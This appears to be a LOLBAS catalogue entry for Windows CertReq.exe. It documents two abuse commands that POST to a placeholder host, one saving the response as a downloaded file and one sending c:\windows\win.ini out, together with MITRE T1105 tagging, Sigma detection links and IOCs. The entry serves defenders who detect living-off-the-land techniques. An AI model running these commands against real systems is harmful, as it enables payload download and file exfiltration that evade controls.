---
Name: CertReq.exe
Description: Used for requesting and managing certificates
Author: 'David Middlehurst'
Created: 2020-07-07
Commands:
  - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
    Description: Save the response from a HTTP POST to the endpoint https://example.org/ as output.txt in the current directory
    Usecase: Download file from Internet
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10, Windows 11
  - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini
    Description: Send the file c:\windows\win.ini to the endpoint https://example.org/ via HTTP POST and show response in terminal
    Usecase: Upload
    Category: Upload
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10, Windows 11
Full_Path:
  - Path: C:\Windows\System32\certreq.exe
  - Path: C:\Windows\SysWOW64\certreq.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_susp_certreq_download.yml
  - IOC: certreq creates new files
  - IOC: certreq makes POST requests
Resources:
  - Link: https://dtm.uk/certreq
Acknowledgement:
  - Person: David Middlehurst
    Handle: '@dtmsecurity'
---
